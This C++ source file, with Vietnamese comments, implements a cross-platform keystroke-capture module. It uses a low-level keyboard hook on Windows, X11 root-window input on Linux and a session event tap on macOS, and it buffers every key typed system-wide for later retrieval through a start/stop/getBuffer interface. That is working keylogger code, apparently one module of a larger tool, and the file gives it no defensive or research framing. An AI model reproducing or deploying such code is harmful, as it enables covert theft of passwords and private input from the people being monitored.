#include "../../include/Modules/KeyController.h"

#ifdef _WIN32
#include <windows.h>
#include <thread>
#include <mutex>
#include <atomic>
namespace {
    std::string keyBuffer;
    std::mutex bufferMutex;
    std::thread msgThread;
    std::atomic<bool> running(false);
    HHOOK hKeyboardHook = nullptr;

    // ================================
    // RAW KEY MAPPING (KHÔNG UNICODE)
    // ================================
    char vkToChar(DWORD vk, bool shift) {
        // A–Z
        if (vk >= 'A' && vk <= 'Z') {
            if (shift) return (char)vk;         // Shift → chữ hoa
            else return (char)(vk + 32);        // thường → chữ thường
        }

        // 0–9
        if (vk >= '0' && vk <= '9') return (char)vk;

        switch (vk) {
        case VK_OEM_1: return shift ? ':' : ';';
        case VK_OEM_2: return shift ? '?' : '/';
        case VK_OEM_3: return shift ? '~' : '`';
        case VK_OEM_4: return shift ? '{' : '[';
        case VK_OEM_5: return shift ? '|' : '\\';
        case VK_OEM_6: return shift ? '}' : ']';
        case VK_OEM_7: return shift ? '"' : '\'';
        case VK_OEM_COMMA:  return shift ? '<' : ',';
        case VK_OEM_PERIOD: return shift ? '>' : '.';
        case VK_OEM_MINUS:  return shift ? '_' : '-';
        case VK_OEM_PLUS:   return shift ? '+' : '=';
        }

        return 0;
    }

    // ========================================
    // HÀM MỚI: KHÔNG DÙNG ToUnicodeEx NỮA
    // ========================================
    std::string KeyCodeToRaw(DWORD vkCode) {
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        // Xử lý các phím đặc biệt
        switch (vkCode) {
            case VK_RETURN: return "[ENTER]";
            case VK_SPACE: return " ";
            case VK_BACK: return "[BKSP]";
            case VK_TAB: return "[TAB]";
            case VK_LCONTROL:
            case VK_RCONTROL: return "[CTRL]";
            case VK_LSHIFT:
            case VK_RSHIFT: return "[SHIFT]";
            case VK_LMENU:
            case VK_RMENU: return "[ALT]";
        }

        char c = vkToChar(vkCode, shift ^ caps); // XOR để xử lý CapsLock

        if (c != 0) return std::string(1, c);

        return ""; // không map được
    }

    LRESULT CALLBACK GlobalKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

            std::string s = KeyCodeToRaw(pKey->vkCode);

            if (!s.empty()) {
                std::lock_guard<std::mutex> lock(bufferMutex);
                keyBuffer += s;
            }
        }

        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }

    void runLoop() {
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, GlobalKeyboardProc, GetModuleHandle(nullptr), 0);

        MSG msg;
        running = true;
        while (running) {
            while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            Sleep(5);
        }
        if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = nullptr;
    }

    void StartWin() {
        running = true;
        msgThread = std::thread(runLoop);
        Sleep(100);
    }

    void StopWin() {
        running = false;
        if (msgThread.joinable()) msgThread.join();
    }
}
#endif

#ifdef __linux__
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <thread>
#include <mutex>
#include <atomic>
namespace {
    std::string keyBuffer;
    std::mutex bufferMutex;
    std::thread x11Thread;
    std::atomic<bool> running(false);
    void runLoop() {
        Display* dpy = XOpenDisplay(nullptr);
        if (!dpy) return;
        Window root = DefaultRootWindow(dpy);
        XSelectInput(dpy, root, KeyPressMask);
        while (running) {
            while (XPending(dpy)) {
                XEvent e;
                XNextEvent(dpy, &e);
                if (e.type == KeyPress) {
                    char buf[32];
                    KeySym ks;
                    int len = XLookupString(&e.xkey, buf, sizeof(buf), &ks, 0);
                    if (len > 0) {
                        std::lock_guard<std::mutex> lock(bufferMutex);
                        keyBuffer += buf[0];
                    }
                }
            }
            usleep(5000);
        }
        XCloseDisplay(dpy);
    }
    void StartLin() {
        running = true;
        x11Thread = std::thread(runLoop);
    }
    void StopLin() {
        running = false;
        if (x11Thread.joinable()) x11Thread.join();
    }
}
#endif

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <thread>
#include <mutex>
#include <atomic>
namespace {
    std::string keyBuffer;
    std::mutex bufferMutex;
    std::thread macThread;
    std::atomic<bool> running(false);
    CFMachPortRef eventTap = nullptr;

    std::string KeyCodeToChar(CGKeyCode keycode) {
        if (keycode == 36) return "\n";
        if (keycode == 49) return " ";
        return "";
    }

    CGEventRef KeyEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void*) {
        if (type == kCGEventKeyDown) {
            CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
            std::string s = KeyCodeToChar(keycode);
            std::lock_guard<std::mutex> lock(bufferMutex);
            keyBuffer += s;
        }
        return event;
    }

    void runLoop() {
        eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0,
            CGEventMaskBit(kCGEventKeyDown), KeyEventCallback, nullptr);
        if (!eventTap) return;
        CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        running = true;
        while (running) CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.005, false);
        CGEventTapEnable(eventTap, false);
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);
        CFRelease(src);
        CFRelease(eventTap);
    }

    void StartMac() {
        running = true;
        macThread = std::thread(runLoop);
        usleep(100000);
    }
    void StopMac() {
        running = false;
        if (macThread.joinable()) macThread.join();
    }
}
#endif

struct KeyController::Impl {
    Impl() = default;
};

KeyController::KeyController() : pImpl(new Impl) {}
KeyController::~KeyController() { delete pImpl; }

KeyController& KeyController::getInstance() {
    static KeyController inst;
    return inst;
}

bool KeyController::startCapture() {
#ifdef _WIN32
    StartWin();
    return true;
#elif defined(__linux__)
    StartLin();
    return true;
#elif defined(__APPLE__)
    StartMac();
    return true;
#endif
    return false;
}

bool KeyController::stopCapture() {
#ifdef _WIN32
    StopWin();
    return true;
#elif defined(__linux__)
    StopLin();
    return true;
#elif defined(__APPLE__)
    StopMac();
    return true;
#endif
    return false;
}

std::string KeyController::getBufferAndClear() {
#ifdef _WIN32
    std::lock_guard<std::mutex> lock(bufferMutex);
    std::string data = keyBuffer; keyBuffer.clear(); return data;
#elif defined(__linux__)
    std::lock_guard<std::mutex> lock(bufferMutex);
    std::string data = keyBuffer; keyBuffer.clear(); return data;
#elif defined(__APPLE__)
    std::lock_guard<std::mutex> lock(bufferMutex);
    std::string data = keyBuffer; keyBuffer.clear(); return data;
#else
    return "";
#endif
}



bool KeyControllerModule::start() {
    // delegate to your KeyController singleton
    return KeyController::getInstance().startCapture();
}

bool KeyControllerModule::stop() {
    return KeyController::getInstance().stopCapture();
}

std::string KeyControllerModule::getBuffer() {
    return KeyController::getInstance().getBufferAndClear();
}